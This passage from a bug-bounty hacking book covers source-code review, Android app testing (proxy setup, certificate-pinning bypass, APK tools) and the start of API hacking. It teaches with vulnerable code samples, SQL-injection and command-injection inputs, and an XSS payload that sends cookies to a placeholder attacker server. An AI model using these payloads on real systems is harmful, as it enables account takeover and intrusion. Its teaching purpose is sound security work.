config,\nsetup, and removed in source code.\nDebug Functionalities, Configuration Files, and Endpoints\nHidden debug functionalities often lead to privilege escalation, as they’re\nintended to let the developers themselves bypass protection mechanisms.\nYou can often find them at special endpoints, so search for strings like HTTP,\nHTTPS, FTP, and dev. For example, you might find a URL like this somewhere\nin the code that points you to an admin panel:\nhttp://dev.example.com/admin?debug=1&password=password # Access debug panel\n340 Chapter 22\nConfiguration files allow you to gain more information about the target\napplication and might contain credentials. You can look for filepaths to\nconfiguration files in source code as well. Configuration files often have the\nfile extensions .conf, .env, .cnf, .cfg, .cf, .ini, .sys, or .plist.\nNext, look for additional paths, deprecated endpoints, and endpoints\nin development. These are endpoints that users might not encounter when\nusing the application normally. But if they work and are discovered by an\nattacker, they can lead to vulnerabilities such as authentication bypass and\nsensitive information leak, depending on the exposed endpoint. You can\nsearch for strings and characters that indicate URLs like HTTP, HTTPS,\nslashes (/), URL parameter markers (?), file extensions (.php, .html, .js,\n.json), and so on.\nThe Detailed Approach\nIf you have more time, complement the fast techniques with a more exten-\nsive source code review to find subtle vulnerabilities. Instead of reading the\nentire codebase line by line, try these strategies to maximize your efficiency.\nImportant Functions\nWhen reading source code, focus on important functions, such as authen-\ntication, password reset, state-changing actions, and sensitive info reads.\nFor example, you’d want to take a close look at this login function, written\nin Python:\ndef login():\nquery = \"SELECT * FROM users WHERE username = '\" + \\\n1 request.username + \"' AND password = '\" + \\\nrequest.password + \"';\"\nauthed_user = database_call(query)\n2 login_as(authed_user)\nThis function looks for a user in the database by using a SQL query\nconstructed from the username and password provided by the user 1. If a\nuser with the specified username and password exists, the function logs in\nthe user 2.\nThis code contains a classic example of a SQL injection vulnerability.\nAt 1, the application uses user input to formulate a SQL query without\nsanitizing the input in any way. Attackers could formulate an attack, for\nexample, by entering admin'-- as the username to log in as the admin user.\nThis works because the query would become the following:\nSELECT password FROM users WHERE username = 'admin' --' AND password = '';\nWhich parts of the application are important depend on the priorities\nof the organization. Also review how important components interact with\nother parts of the application. This will show you how an attacker’s input\ncan affect different parts of the application.\nConducting Code Reviews 341\nUser Input\nAnother approach is to carefully read the code that processes user input.\nUser input, such as HTTP request parameters, HTTP headers, HTTP\nrequest paths, database entries, file reads, and file uploads provide the entry\npoints for attackers to exploit the application’s vulnerabilities. This can help\nfind common vulnerabilities such as stored XSS, SQL injections, and XXEs.\nFocusing on parts of the code that deal with user input will provide a\ngood starting point for identifying potential dangers. Make sure to also\nreview how the user input gets stored or transferred. Finally, see whether\nother parts of the application use the previously processed user input. You\nmight find that the same user input interacts differently with various com-\nponents of the application.\nFor example, the following snippet accepts user input. The PHP vari-\nable $_GET contains the parameters submitted in the URL query string, so\nthe variable $_GET['next'] refers to the value of the URL query parameter\nnamed next:\n<?php\n[...]\nif ($logged_in){\n1 $redirect_url = $_GET['next'];\n2 header(\"Location: \". $redirect_url);\nexit;\n}\n[...]\n?>\nThis parameter gets stored in the $redirect_url variable 1. Then the\nheader() PHP function sets the response header Location to that variable 2.\nThe Location header controls where the browser redirects a user. This\nmeans the user will be redirected to the location specified in the next URL\nparameter.\nThe vulnerability in this code snippet is an open redirect. The next URL\nquery parameter is used to redirect the user after login, but the application\ndoesn’t validate the redirect URL before redirecting the user. It simply takes\nthe value of the URL query parameter next and sets the response header\naccordingly.\nEven a more robust version of this functionality might contain vulner-\nabilities. Take a look at this code snippet:\n<?php\n[...]\nif ($logged_in){\n$redirect_url = $_GET['next'];\n342 Chapter 22\n1 if preg_match(\"/example.com/\", $redirect_url){\nheader(\"Location: \". $redirect_url);\nexit;\n}\n}\n[...]\n?>\nNow the code contains some input validation: the preg_match(PATTERN,\nSTRING) PHP function checks whether the STRING matches the regex pattern\nPATTERN 1. Presumably, this pattern would make sure the page redirects to a\nlegitimate location. But this code still contains an open redirect. Although\nthe application now validates the redirect URL before redirecting the user,\nit does so incompletely. It checks only whether the redirect URL contains\nthe string example.com. As discussed in Chapter 7, attackers could easily bypass\nthis protection by using a redirect URL such as attacker.com/example.com,\nor example.com.attacker.com.\nLet’s look at another instance where tracing user input can point us to\nvulnerabilities. The parse_url(URL, COMPONENT) PHP function parses a URL\nand returns the specified URL component. For example, this function will\nreturn the string /index.html. In this case, it returns the PHP_URL_PATH, the\nfilepath part of the input URL:\nparse_url(\"https://www.example.com/index.html\", PHP_URL_PATH)\nCan you spot the vulnerabilities in the following piece of PHP code?\n<?php\n[...]\n1 $url_path = parse_url($_GET['download_file'], PHP_URL_PATH);\n2 $command = 'wget -o stdout https://example.com' . $url_path;\n3 system($command, $output);\n4 echo \"<h1> You requested the page:\" . $url_path . \"</h1>\";\necho $output;\n[...]\n?>\nThis page contains a command injection vulnerability and a reflected\nXSS vulnerability. You can find them by paying attention to where the appli-\ncation uses the user-supplied download_file parameter.\nLet’s say this page is located at https://example.com/download. This code\nretrieves the download_file URL query parameter and parses the URL\nto retrieve its path component 1. Then the server downloads the file\nlocated on the example.com server with the filepath that matches the path\nConducting Code Reviews 343\nin the download_file URL 2. For example, visiting this URL will download\nthe file https://example.com/abc:\nhttps://example.com/download?download_file=https://example.com/abc\nThe PHP system() command executes a system command, and\nsystem(COMMAND, OUTPUT) will store the output of COMMAND into the variable\nOUTPUT. This program passes user input into a variable $command, then into the\nsystem() function 3. This means that users can get arbitrary code executed\nby injecting their payload into the $url_path. They’d simply have to meddle\nwith the download_file GET parameter while requesting a page, like this:\nhttps://example.com/download?download_file=https://example.com/download;ls\nThe application then displays a message on the web page by using\ndirect user input 4. Attackers could embed an XSS payload in the download\n_file’s URL path portion and get it reflected onto the victim’s page after a\nvictim user accesses the crafted URL. The exploit URL can be generated\nwith this code snippet. (Note that the second line wraps onto a third for dis-\nplay purposes.)\n<?php\n$exploit_string = \"<script>document.location='http://attacker_server_ip/cookie_stealer\n.php?c='+document.cookie;</script>\";\necho \"https://example.com/\" . $exploit_string;\n?>\nExercise: Spot the Vulnerabilities\nSome of these tips may seem abstract, so let’s walk through an example pro-\ngram, written in Python, that will help you practice the tricks introduced\nin this chapter. Ultimately, reviewing source code is a skill to be practiced.\nThe more you look at vulnerable code, the more adept you will become at\nspotting bugs.\nThe following program has multiple issues. See how many you can find:\nimport requests\nimport urllib.parse as urlparse\nfrom urllib.parse import parse_qs\napi_path = \"https://api.example.com/new_password\"\nuser_data = {\"new_password\":\"\", \"csrf_token\":\"\"}\ndef get_data_from_input(current_url):\n# get the URL parameters\n# todo: we might want to stop putting user passwords 1\n# and tokens in the URL! This is really not secure.\n# todo: we need to ask for the user's current password\n# before they can change it!\nurl_object = urlparse.urlparse(current_url)\nquery_string = parse_qs(url_object.query)\n344 Chapter 22\ntry:\nuser_data[\"new_password\"] = query_string[\"new_password\"][0]\nuser_data[\"csrf_token\"] = query_string[\"csrf_token\"][0]\nexcept: pass\ndef new_password_request(path, user_data):\nif user_data[\"csrf_token\"]: 2\nvalidate_token(user_data[\"csrf_token\"])\nresp = requests.Response()\ntry:\nresp = requests.post(url=path, headers=headers, timeout=15, verify=False, data=user_data)\nprint(\"Your new password is set!\")\nexcept: pass\ndef validate_token(csrf_token):\nif (csrf_token == session.csrf_token):\npass\nelse:\nraise Exception(\"CSRF token incorrect. Request rejected.\")\ndef validate_referer(): 3\n# todo: implement actual referer check! Now the function is a placeholder. 4\nif self.request.referer:\nreturn True\nelse:\nthrow_error(\"Referer incorrect. Request rejected.\")\nif __name__ == \"__main__\":\nvalidate_referer()\nget_data_from_input(self.request.url)\nnew_password_request(api_path, user_data)\nLet’s begin by considering how this program works. It’s supposed to take\na new_password URL parameter to set a new password for the user. It parses\nthe URL parameters for new_password and csrf_token. Then, it validates the\nCSRF token and performs the POST request to change the user’s password.\nThis program has multiple issues. First, it contains several revealing\ndeveloper comments 1. It points out that the request to change the user’s\npassword is initiated by a GET request, and both the user’s new password\nand CSRF token are communicated in the URL. Transmitting secrets in\nURLs is bad practice because they may be made available to browser his-\ntories, browser extensions, and traffic analytics providers. This creates the\npossibility of attackers stealing these secrets. Next, another development\ncomment points out that the user’s current password isn’t needed to change\nto a new password! A third revealing comment points out to the attacker\nthat the CSRF referer check functionality is incomplete 4.\nYou can see for yourself that the program employs two types of CSRF\nprotection, both of which are incomplete. The referer check function\nchecks only if the referer is present, not whether the referer URL is from\na legitimate site 3. Next, the site implements incomplete CSRF token\nvalidation. It checks that the CSRF token is valid only if the csrf_token\nConducting Code Reviews 345\nparameter is provided in the URL 2. Attackers will be able to execute the\nCSRF to change users’ passwords by simply providing them with a URL that\ndoesn’t have the csrf_token parameter, or contains a blank csrf_token, as in\nthese examples:\nhttps://example.com/change_password?new_password=abc&csrf_token=\nhttps://example.com/change_password?new_password=abc\nCode review is an effective way of finding vulnerabilities, so if you can\nextract source code at any point during your hacking process, dive into the\nsource code and see what you can find. Manual code review can be time-\nconsuming. Using static analysis security testing (SAST) tools is a great way\nto automate the process. Many open source and commercial SAST tools\nwith different capabilities exist, so if you are interested in code analysis and\nparticipating in many source code programs, you might want to look into\nusing a SAST tool that you like.\n346 Chapter 22\n23\nHACKING ANDROID APPS\nYou’ve spent the entirety of this book thus\nfar learning to hack web applications. The\nmajority of bug bounty programs offer boun-\nties on their web apps, so mastering web hacking\nis the easiest way to get started in bug bounties, as it will\nunlock the widest range of targets.\nOn the other hand, mobile hacking has a few more prerequisite skills\nand takes more time to get started. But because of the higher barrier to\nentry, fewer hackers tend to work on mobile programs. Also, the number of\nmobile programs is rising as companies increasingly launch complex mobile\nproducts. Mobile programs can sometimes be listed under the Mobile or IoT\nsections of the company’s main bug bounty program. This means that if you\nlearn to hack mobile applications, you’ll likely file fewer duplicate reports\nand find more interesting bugs.\nDespite the more involved setup, hacking mobile applications is very\nsimilar to hacking web applications. This chapter introduces the additional\nskills you need to learn before you begin analyzing Android apps.\nCompanies with mobile applications typically have both Android and\niOS versions of an app. We won’t cover iOS applications, and this chapter\nis by no means a comprehensive guide to hacking Android applications.\nBut, along with the previous chapters, it should give you the foundation you\nneed to start exploring the field on your own.\nNOTE One of the best resources to reference for mobile hacking is the OWASP Mobile Security\nTesting Guide (https://github.com/OWASP/owasp-mstg/).\nSetting Up Your Mobile Proxy\nIn the same way that you configured your web browser to work with your\nproxy, you’ll need to set up your testing mobile device to work with a proxy.\nThis generally involves installing the proxy’s certificate on your device and\nadjusting your proxy’s settings.\nIf you can afford to do so, acquire another mobile device, or use one\nof your old devices for testing. Mobile testing is dangerous: you might acci-\ndentally damage your device, and many of the techniques mentioned in this\nchapter will void the device’s warranty. You can also use a mobile emulator\n(a program that simulates a mobile device) for testing.\nFirst, you’ll need to configure Burp’s proxy to accept connections\nfrom your mobile device, because by default, Burp’s proxy accepts con-\nnections only from the machine Burp is running on. Navigate to Burp’s\nProxyOptions tab. In the Proxy Listeners section, click Add. In the pop-up\nwindow (Figure 23-1), enter a port number that is not currently in use and\nselect All interfaces as the Bind to address option. Click OK.\nFigure 23-1: Setting up Burp to accept connections from all devices on the Wi-Fi network\nYour proxy should now accept connections from any device connected\nto the same Wi-Fi network. As such, I do not recommend doing this on a\npublic Wi-Fi network.\n348 Chapter 23\nNext, you’ll configure your Android device to work with the proxy.\nThese steps will vary slightly based on the system you’re using, but the pro-\ncess should be some version of choosing SettingsNetworkWi-Fi, select-\ning (usually by tapping and holding) the Wi-Fi network you’re currently\nconnected to, and selecting Modify Network. You should then be able to\nselect a proxy hostname and port. Here, you should enter your computer’s\nIP address and the port number you selected earlier. If you’re using a\nLinux computer, you can find your computer’s IP address by running this\ncommand:\nhostname -i\nIf you are using a Mac, you can find your IP with this command:\nipconfig getifaddr en0\nYour Burp proxy should now be ready to start intercepting traffic\nfrom your mobile device. The process of setting up a mobile emulator to\nwork with your proxy is similar to this process, except that some emulators\nrequire that you add proxy details from the emulator settings menu instead\nof the network settings on the emulated device itself.\nIf you want to intercept and decode HTTPS traffic from your mobile\ndevice as well, you’ll need to install Burp’s certificate on your device. You\ncan do this by visiting http://burp/cert in the browser on your computer\nthat uses Burp as a proxy. Save the downloaded certificate, email it to\nyourself, and download it to your mobile device. Next, install the certifi-\ncate on your device. This process will also depend on the specifics of the\nsystem running on your device, but it should be something like choosing\nSettingsSecurityInstall Certificates from Storage. Click the certificate\nyou just downloaded and select VPN and apps for the Certificate use option.\nYou’ll now be able to audit HTTPS traffic with Burp.\nBypassing Certificate Pinning\nCertificate pinning is a mechanism that limits an application to trusting\npredefined certificates only. Also known as SSL pinning or cert pinning, it\nprovides an additional layer of security against man-in-the-middle attacks, in\nwhich an attacker secretly intercepts, reads, and alters the communications\nbetween two parties. If you want to intercept and decode the traffic of an\napplication that uses certificate pinning, you’ll have to bypass the certificate\npinning first, or the application won’t trust your proxy’s SSL certificate and\nyou won’t be able to intercept HTTPS traffic.\nIt’s sometimes necessary to bypass certificate pinning to intercept the\ntraffic of better-protected apps. If you’ve successfully set up your mobile\ndevice to work with a proxy but still cannot see the traffic belonging to your\ntarget application, that app may have implemented certificate pinning.\nThe process of bypassing cert pinning will depend on how the\ncertificate pinning is implemented for each application. For Android\nHacking Android Apps 349\napplications, you have a few options for bypassing the pinning. You can use\nFrida, a tool that allows you to inject scripts into the application. You can\ndownload Frida from https://frida.re/docs/installation/. Then use the Universal\nAndroid SSL Pinning Bypass Frida script (https://codeshare.frida.re/@pcipolloni/\nuniversal-android-ssl-pinning-bypass-with-frida/). Another tool that you could use\nto automate this process is Objection (https://github.com/sensepost/objection/),\nwhich uses Frida to bypass pinning for Android or iOS. Run the Objection\ncommand android sslpinning disable to bypass pinning.\nFor most applications, you can bypass the certificate pinning by using\nthese automated tools. But if the application implements pinning with cus-\ntom code, you might need to manually bypass it. You could overwrite the\npackaged certificate with your custom certificate. Alternately, you could\nchange or disable the application’s certificate validation code. The process\nof executing these techniques is complicated and highly dependent on the\napplication that you’re targeting, so I won’t go into detail. For more infor-\nmation on these methods, you’ll have to do some independent research.\nAnatomy of an APK\nBefore you attack Android applications, you must first understand what\nthey are made of. Android applications are distributed and installed in a\nfile format called Android Package (APK). APKs are like ZIP files that contain\neverything an Android application needs to operate: the application code,\nthe application manifest file, and the application’s resources. This section\ndescribes the main components of an Android APK.\nFirst, the AndroidManifest.xml file contains the application’s package\nname, version, components, access rights, and referenced libraries, as well\nas other metadata. It’s a good starting point for exploring the applica-\ntion. From this file, you can gain insights into the app’s components and\npermissions.\nUnderstanding the components of your target application will pro-\nvide you with a good overview of how it works. There are four types of app\ncomponents: Activities (declared in <activity> tags), Services (declared\nin <service> tags), BroadcastReceivers (declared in <receiver> tags), and\nContentProviders (declared in <provider> tags).\nActivities are application components that interact with the user. The\nwindows of Android applications you see are made up of Activities. Services\nare long-running operations that do not directly interact with the user, such\nas retrieving or sending data in the background. BroadcastReceivers allow an\napp to respond to broadcast messages from the Android system and other\napplications. For instance, some applications download large files only when\nthe device is connected to Wi-Fi, so they need a way to be notified when the\ndevice connects to a Wi-Fi network. ContentProviders provide a way to share\ndata with other applications.\nThe permissions that the application uses, such as the ability to send\ntext messages and the permissions other apps need to interact with it, are\nalso declared in this AndroidManifest.xml file. This will give you a good sense\n350 Chapter 23\nof what the application can do and how it interacts with other applications\non the same device. For more about what you can find in AndroidManifest.xml,\nvisit https://developer.android.com/guide/topics/manifest/manifest-intro/.\nThe classes.dex file contains the application source code compiled in the\nDEX file format. You can use the various Android hacking tools introduced\nlater in this chapter to extract and decompile this source code for analysis.\nFor more on conducting source code reviews for vulnerabilities, check out\nChapter 22.\nThe resources.arsc file contains the application’s precompiled resources,\nsuch as strings, colors, and styles. The res folder contains the application’s\nresources not compiled into resources.arsc. In the res folder, the res/values/\nstrings.xml file contains literal strings of the application.\nThe lib folder contains compiled code that is platform dependent. Each\nsubdirectory in lib contains the specific source code used for a particular\nmobile architecture. Compiled kernel modules are located here and are\noften a source of vulnerabilities.\nThe assets folder contains the application’s assets, such as video, audio, and\ndocument templates. Finally, the META-INF folder contains the MANIFEST.MF\nfile, which stores metadata about the application. This folder also contains the\ncertificate and signature of the APK.\nTools to Use\nNow that you understand the main components of an Android application,\nyou’ll need to know how to process the APK file and extract the Android\nsource code. Besides using a web proxy to inspect the traffic to and from\nyour test device, you’ll need some tools that are essential to analyzing\nAndroid applications. This section doesn’t go into the specifics of how to\nuse these tools, but rather when and why to use them. The rest you can eas-\nily figure out by using each tool’s documentation pages.\nAndroid Debug Bridge\nThe Android Debug Bridge (ADB) is a command line tool that lets your com-\nputer communicate with a connected Android device. This means you won’t\nhave to email application source code and resource files back and forth\nbetween your computer and your phone if you want to read or modify them\non the computer. For example, you can use ADB to copy files to and from\nyour device, or to quickly install modified versions of the application you’re\nresearching. ADB’s documentation is at https://developer.android.com/studio/\ncommand-line/adb/.\nTo start using ADB, connect your device to your laptop with a USB\ncable. Then turn on debugging mode on your device. Whenever you want to\nuse ADB on a device connected to your laptop over USB, you must enable\nUSB debugging. This process varies based on the mobile device, but\nshould be similar to choosing SettingsSystem Developer Options\nDebugging. This will enable you to interact with your device from your\nlaptop via ADB. On Android version 4.1 and lower, the developer options\nHacking Android Apps 351\nscreen is available by default. In versions of Android 4.2 and later, developer\noptions need to be enabled by choosing SettingsAbout Phone and then\ntapping the Build number seven times.\nOn your mobile device, you should see a window prompting you to\nallow the connection from your laptop. Make sure that your laptop is con-\nnected to the device by running this command in your laptop terminal:\nadb devices -l\nNow you can install APKs with this command:\nadb install PATH_TO_APK\nYou can also download files from your device to your laptop by running\nthe following:\nadb pull REMOTE_PATH LOCAL_PATH\nOr copy files on your laptop to your mobile device:\nadb push LOCAL_PATH REMOTE_PATH\nAndroid Studio\nAndroid Studio is software used for developing Android applications, and you\ncan use it to modify an existing application’s source code. It also includes\nan emulator that lets you run applications in a virtual environment if you\ndon’t have a physical Android device. You can download and read about\nAndroid Studio at https://developer.android.com/studio/.\nApktool\nApktool, a tool for reverse engineering APK files, is essential for Android\nhacking and will probably be the tool you use most frequently during your\nanalysis. It converts APKs into readable source code files and reconstructs\nan APK from these files. The Apktool’s documentation is at https://ibotpeaches\n.github.io/Apktool/.\nYou can use Apktool to get individual files from an APK for source\ncode analysis. For example, this command extracts files from an APK called\nexample.apk:\n$ apktool d example.apk\nSometimes you might want to modify an APK’s source code and see if\nthat changes the behavior of the app. You can use Apktool to repackage\nindividual source code files after making modifications. This command\npackages the content of the example folder into the file example.apk:\n$ apktool b example -o example.apk\n352 Chapter 23\nFrida\nFrida (https://frida.re/) is an amazing instrumentation toolkit that lets you\ninject your script into running processes of the application. You can use it\nto inspect functions that are called, analyze the app’s network connections,\nand bypass certificate pinning.\nFrida uses JavaScript as its language, so you will need to know JavaScript\nto take full advantage of it. However, you can access plenty of premade\nscripts shared online.\nMobile Security Framework\nI also highly recommend the Mobile Security Framework (https://github.com/\nMobSF/Mobile-Security-Framework-MobSF/), or the MobSF, for all things\nmobile app testing. This automated mobile application testing framework\nfor Android, iOS, and Windows can do both static and dynamic testing. It\nautomates many of the techniques that I talk about in this chapter and is a\ngood tool to add to your toolkit once you understand the basics of Android\nhacking.\nHunting for Vulnerabilities\nNow that your mobile hacking environment is set up, it’s time to start hunt-\ning for vulnerabilities in the mobile app. Luckily, hacking mobile applica-\ntions is not that different from hacking web applications.\nTo start, extract the application’s package contents and review the code\nfor vulnerabilities. Compare authentication and authorization mechanisms\nfor the mobile and web apps of the same organization. Developers may\ntrust data coming from the mobile app, and this could lead to IDORs or\nbroken authentication if you use a mobile endpoint. Mobile apps also tend\nto have issues with session management, such as reusing session tokens,\nusing longer sessions, or using session cookies that don’t expire. These\nissues can be chained with XSS to acquire session cookies that allow attack-\ners to take over accounts even after users log out or change their passwords.\nSome applications use custom implementations for encryption or hashing.\nLook for insecure algorithms, weak implementations of known algorithms,\nand hardcoded encryption keys. After reviewing the application’s source\ncode for potential vulnerabilities, you can validate your findings by testing\ndynamically on an emulator or a real device.\nMobile applications are an excellent place to search for additional web\nvulnerabilities not present in their web application equivalent. You can hunt\nfor these with the same methodology you used to find web vulnerabilities:\nusing Burp Suite to intercept the traffic coming out of the mobile app during\nsensitive actions. Mobile apps often make use of unique endpoints that may\nnot be as well tested as web endpoints because fewer hackers hunt on mobile\napps. You can find them by looking for endpoints that you haven’t seen in the\norganization’s web applications.\nHacking Android Apps 353\nI recommend testing an organization’s web applications first, before\nyou dive into its mobile applications, since a mobile application is often\na simplified version of its web counterpart. Search for IDORs, SQL injec-\ntions, XSS, and other common web vulnerabilities by using the skills you’ve\nalready learned. You can also look for common web vulnerabilities by ana-\nlyzing the source code of the mobile application.\nIn addition to the vulnerabilities that you look for in web applications,\nsearch for some mobile-specific vulnerabilities. AndroidManifest.xml contains\nbasic information about the application and its functionalities. This file is\na good starting point for your analysis. After you’ve unpacked the APK file,\nread it to gain a basic understanding of the application, including its com-\nponents and the permissions it uses. Then you can dive into other files to\nlook for other mobile-specific vulnerabilities.\nThe source code of mobile applications often contains hardcoded\nsecrets or API keys that the application needs to access web services. The\nres/values/strings.xml file stores the strings in the application. It’s a good\nplace to look for hardcoded secrets, keys, endpoints, and other types of info\nleaks. You can also search for secrets in other files by using grep to search\nfor the keywords mentioned in Chapter 22.\nIf you find files with the .db or .sqlite extensions, these are database files.\nLook inside these files to see what information gets shipped along with the\napplication. These are also an easy source of potential secrets and sensitive\ninformation leaks. Look for things like session data, financial information,\nand sensitive information belonging to the user or organization.\nUltimately, looking for mobile vulnerabilities is not that different from\nhacking web applications. Closely examine the interactions between the cli-\nent and the server, and dive into the source code. Keep in mind the special\nclasses of vulnerabilities, like hardcoded secrets and the storage of sensitive\ndata in database files, that tend to manifest in mobile apps more than in\nweb applications.\n354 Chapter 23\n24\nAPI HACKING\nApplication programming interfaces (APIs) are\na way for programs to communicate with\neach other, and they power a wide variety\nof applications. As applications become more\ncomplex, developers are increasingly using APIs to\ncombine components of an application or multiple applications belong-\ning to the same organization. And more and more, APIs have the ability to\nexecute important actions or communicate sensitive information.\nIn this chapter, we’ll talk about what APIs are, how they work, and how\nyou can find and exploit API vulnerabilities.\nWhat Are APIs?\nIn simple terms, an API is a set of rules that allow one application to commu-\nnicate with another. They enable applications to share data in a controlled\nway. Using APIs, applications on the internet can take advantage of other\napplications’ resources to build more complex features.\nFor example, consider Twitter’s API (https://developer.twitter.com/en/docs/\ntwitter-api/). This public API allows outside developers to access Twitter’s\ndata and actions. For example, if a developer wants their code to retrieve\nthe contents of a tweet from Twitter’s database, they can use a Twitter API\nendpoint that returns tweet information by sending a GET request to the\nTwitter API server located at api.twitter.com:\nGET /1.1/statuses/show.json?id=210462857140252672\nHost: api.twitter.com\nThis URL indicates that the developer is using Twitter’s API version 1.1\nand requesting the resource called statuses (which is what Twitter calls its\ntweets) with the ID 210462857140252672. The id field in the URL is a request\nparameter required by the API endpoint. API endpoints often require cer-\ntain parameters to determine which resource to return.\nTwitter’s API server would then return the data in JSON format to the\nrequesting application (this example is taken from Twitter’s public API\ndocumentation):\n1 {\n2 \"created_at\": \"Wed Oct 10 20:19:24 +0000 2018\",\n\"id\": 1050118621198921728,\n\"id_str\": \"1050118621198921728\",\n\"text\": \"To make room for more expression, we will now count all emojis\nas equal—including those with gender... and skin t... https://t.co/\nMkGjXf9aXm\",\n\"truncated\": true,\n\"entities\": {\n3 \"hashtags\": [],\n\"symbols\": [],\n\"user_mentions\": [],\n\"urls\": [\n{\n\"url\": \"https://t.co/MkGjXf9aXm\",\n\"expanded_url\": \"https://twitter.com/i/web/\nstatus/1050118621198921728\",\n\"display_url\": \"twitter.com/i/web/status/1...\",\n\"indices\": [\n117,\n140\n]\n}\n]\n},\n4 \"user\": {\n\"id\": 6253282,\n\"id_str\": \"6253282\",\n\"name\": \"Twitter API\",\n\"screen_name\": \"TwitterAPI\",\n\"location\": \"San Francisco, CA\",\n\"description\": \"The Real Twitter API. Tweets about API changes, service\nissues and our Developer Platform.\nDon't get an answer? It's on my website.\",\n356 Chapter 24\n[...]\n1 }\nAPIs usually return data in JSON or XML format. JSON is a way to rep-\nresent data in plaintext, and it’s commonly used to transport data within\nweb messages. You’ll often see JSON messages when you’re testing applica-\ntions, so it’s helpful to learn how to read them.\nJSON objects start and end with a curly bracket 1. Within these curly\nbrackets, the properties of the represented object are stored in key-value pairs.\nFor example, in the preceding data block representing a tweet, the created_at\nproperty has the value Wed Oct 10 20:19:24 +0000 2018. This indicates that the\ntweet was created on Wednesday, October 10, 2018 at 8:19 PM 2.\nJSON objects can also contain lists or other objects. Curly brackets\ndenote objects. The preceding tweet contains a user object indicating the\nuser who created the tweet 4. Lists are denoted with square brackets.\nTwitter returned an empty list of hashtags in the preceding JSON block,\nwhich means no hashtags were used in the tweet 3.\nYou might be wondering how the API server decides who can access\ndata or execute actions. APIs often require users to authenticate before\naccessing their services. Typically, users include access tokens in their API\nrequests to prove their identities. Other times, users are required to use\nspecial authentication headers or cookies. The server would then use the\ncredentials presented in the request to determine which resources and\nactions the user should access.\nREST APIs\nThere are multiple kinds of APIs. The Twitter API discussed here is called\na Representational State Transfer (REST) API. REST is one of the most com-\nmonly used API structures. Most of the time, REST APIs return data in\neither JSON or plaintext format. REST API users send requests to specific\nresource endpoints to access that resource. In Twitter’s case, you send GET\nrequests to https://api.twitter.com/1.1/statuses/show/ to retrieve tweet informa-\ntion, and GET requests to https://api.twitter.com/1.1/users/show/ to retrieve\nuser information.\nREST APIs usually have defined structures for queries that make it easy\nfor users to predict the specific endpoints to which they should send their\nrequests. For example, to delete a tweet via the Twitter API, users can send\na POST request to https://api.twitter.com/1.1/statuses/destroy/, and to retweet\na tweet, users can send a POST request to https://api.twitter.com/1.1/statuses/\nretweet/. You can see here that all of Twitter’s API endpoints are structured\nin the same way (https://api.twitter.com/1.1/RESOURCE/ACTION):\nhttps://api.twitter.com/1.1/users/show\nhttps://api.twitter.com/1.1/statuses/show\nhttps://api.twitter.com/1.1/statuses/destroy\nhttps://api.twitter.com/1.1/statuses/retweet\nAPI Hacking 357\nREST APIs can also use various HTTP methods. For example, GET is\nusually used to retrieve resources, POST is used to update or create resources,\nPUT is used to update resources, and DELETE is used to delete them.\nSOAP APIs\nSOAP is an API architecture that is less commonly used in modern applica-\ntions. But plenty of older apps and IoT apps still use SOAP APIs. SOAP APIs\nuse XML to transport data, and their messages have a header and a body. A\nsimple SOAP request looks like this:\nDELETE / HTTPS/1.1\nHost: example.s3.amazonaws.com\n<DeleteBucket xmlns=\"http://doc.s3.amazonaws.com/2006-03-01\">\n<Bucket>quotes</Bucket>\n<AWSAccessKeyId> AKIAIOSFODNN7EXAMPLE</AWSAccessKeyId>\n<Timestamp>2006-03-01T12:00:00.183Z</Timestamp>\n<Signature>Iuyz3d3P0aTou39dzbqaEXAMPLE=</Signature>\n</DeleteBucket>\nThis example request is taken from Amazon S3’s SOAP API documen-\ntation. It deletes an S3 bucket named quotes. As you can see, API request\nparameters are passed to the server as tags within the XML document.\nThe SOAP response looks like this:\n<DeleteBucketResponse xmlns=\"http://s3.amazonaws.com/doc/2006-03-01\">\n<DeleteBucketResponse>\n<Code>204</Code>\n<Description>No Content</Description>\n</DeleteBucketResponse>\n</DeleteBucketResponse>\nThis response indicates that the bucket is successfully deleted and no\nlonger found.\nSOAP APIs have a service called Web Services Description Language (WSDL),\nused to describe the structure of the API and how to access it. If you can find\nthe WSDL of a SOAP API, you can use it to understand the API before hack-\ning it. You can often find WSDL files by adding .wsdl or ?wsdl to the end of an\nAPI endpoint or searching for URL endpoints containing the term wsdl. In\nthe WSDL, you will be able to find a list of API endpoints you can test.\nGraphQL APIs\nGraphQL is a newer API technology that allows developers to request the\nprecise resource fields they need, and to fetch multiple resources with just\na single API call. GraphQL is becoming increasingly common because of\nthese benefits.\nGraphQL APIs use a custom query language and a single endpoint\nfor all the API’s functionality. These endpoints are commonly located at\n358 Chapter 24\n/graphql, /gql, or /g. GraphQL has two main kinds of operations: queries\nand mutations. Queries fetch data, just like the GET requests in REST APIs.\nMutations create, update, and delete data, just like the POST, PUT, and\nDELETE requests in REST APIs.\nAs an example, take a look at the following API requests to Shopify’s\nGraphQL API. Shopify is an e-commerce platform that allows users to\ninteract with their online stores via a GraphQL API. To access Shopify’s\nGraphQL API, developers need to send POST requests to the endpoint\nhttps://SHOPNAME.myshopify.com/admin/api/API_VERSION/graphql.json with\nthe GraphQL query in the POST request body. To retrieve information\nabout your shop, you can send this request:\nquery {\nshop {\nname\nprimaryDomain {\nurl\nhost\n}\n}\n}\nThis GraphQL query indicates that we want to retrieve the name and\nprimaryDomain of the shop, and that we need only the primaryDomain’s URL\nand host properties.\nShopify’s server will return the requested information in JSON format:\n{\n\"data\": {\n\"shop\": {\n\"name\": \"example\",\n\"primaryDomain\": {\n\"url\": \"https://example.myshopify.com\",\n\"host\": \"example.myshopify.com\"\n}\n}\n}\n}\nNotice that the response doesn’t contain all the object’s fields, but\ninstead the exact fields the user has requested. Depending on your needs,\nyou can request either more or fewer fields of the same data object. Here is\nan example that requests fewer:\nquery {\nshop {\nname\n}\n}\nAPI Hacking 359\nYou can also request the precise subfields of a resource’s properties and\nother nested properties. For example, here, you request only the URL of\nthe primaryDomain of a shop:\nquery {\nshop {\nprimaryDomain {\nurl\n}\n}\n}\nThese queries are all used to retrieve data.\nMutations, used to edit data, can have arguments and return values.\nLet’s take a look at an example of a mutation taken from graphql.org. This\nmutation creates a new customer record and takes three input parameters:\nfirstName, lastName, and email. It then returns the ID of the newly created\ncustomer:\nmutation {\ncustomerCreate(\ninput: {\nfirstName: \"John\",\nlastName: \"Tate\",\nemail: \"john@johns-apparel.com\" })\n{\ncustomer {\nid\n}\n}\n}\nGraphQL’s unique syntax might make testing it hard at first, but once\nyou understand it, you can test these APIs the same way that you test other\ntypes of APIs. To learn more about GraphQL’s syntax, visit https://graphql.org/.\nGraphQL APIs also include a great reconnaissance tool for bug hunters:\na feature called introspection that allows API users 